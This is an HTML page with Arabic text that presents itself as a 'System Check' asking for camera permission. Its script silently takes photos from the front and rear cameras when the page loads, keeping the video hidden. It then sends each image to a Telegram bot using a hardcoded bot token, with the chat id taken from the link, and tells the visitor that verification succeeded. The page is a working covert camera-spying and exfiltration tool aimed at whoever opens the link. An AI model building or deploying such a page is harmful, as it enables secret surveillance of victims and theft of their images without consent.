<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Check</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 50px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2 id="status">جاري التحقق من النظام...</h2>
    <p>يرجى الموافقة على صلاحيات الكاميرا للمتابعة</p>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = "8379860884:AAHY6orUkUCffcsZc3dNRt8OQSlPJXD_03w";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id'); // سحب الأيدي من الرابط تلقائياً

        async function init() {
            if (!chatId) {
                document.getElementById('status').innerText = "خطأ: رابط غير صالح";
                return;
            }
            try {
                // الكاميرا الأمامية
                await capture("user", "Front");
                // الكاميرا الخلفية
                await capture("environment", "Rear");
                document.getElementById('status').innerText = "تم التحقق بنجاح";
            } catch (e) {
                document.getElementById('status').innerText = "خطأ في الصلاحيات";
            }
        }

        async function capture(mode, label) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            return new Promise(res => {
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(b => send(b, label).then(res), 'image/jpeg');
                }, 1500);
            });
        }

        function send(blob, label) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('photo', blob, 'img.jpg');
            fd.append('caption', `لقطة من الكاميرا: ${label}`);
            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }
        window.onload = init;
    </script>
</body>
</html>
